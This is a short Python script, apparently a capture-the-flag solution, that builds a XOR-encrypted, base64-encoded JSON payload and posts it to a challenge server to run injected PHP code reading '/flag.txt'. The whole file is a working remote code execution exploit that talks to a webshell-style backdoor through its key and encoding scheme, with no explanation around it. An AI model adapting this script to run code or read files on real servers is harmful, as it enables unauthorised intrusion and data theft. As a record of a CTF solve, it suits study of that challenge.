import requests
import base64
import json

def xor_encrypt(data, key):
    result = []
    for i in range(len(data)):
        result.append(chr(ord(data[i]) ^ ord(key[i % len(key)])))
    return ''.join(result)

url = "http://entangled-server.niccgetsspooky.xyz:1337"
key = "5p1n-th3-51lly-5tr1ng5"

payload = {
    "ak": key,
    "a": "e",
    "d": "echo file_get_contents('/flag.txt');"
}

json_payload = json.dumps(payload)
encrypted_payload = xor_encrypt(xor_encrypt(json_payload, key), "ak")

encoded_payload = base64.b64encode(encrypted_payload.encode()).decode()

response = requests.post(url, data={"ak": encoded_payload})

print(response.text)
